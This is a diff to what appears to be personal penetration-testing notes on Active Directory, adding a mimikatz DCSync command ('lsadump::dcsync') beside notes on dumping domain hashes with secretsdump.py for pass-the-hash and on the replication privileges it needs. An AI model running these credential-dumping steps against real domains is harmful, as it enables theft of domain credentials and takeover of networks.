@@ -6,6 +6,10 @@
 
 ### 3) Accounts used for privileged AD Services (SCCM,WSUS,Exchange,etc.)
 
+#### 1) mimikatz
+
+#### 2) lsadump::dcsync /domain:DOMAIN /user:OUR_LOW-PRIVILEGE_AD_USERNAME
+
 ### Secretsdump.py on an account that is synced with the domain controller to dump hashes to PtH attack.
 
 ### Privileges: Replicate Directory Changes, Replicate Directory Changes All
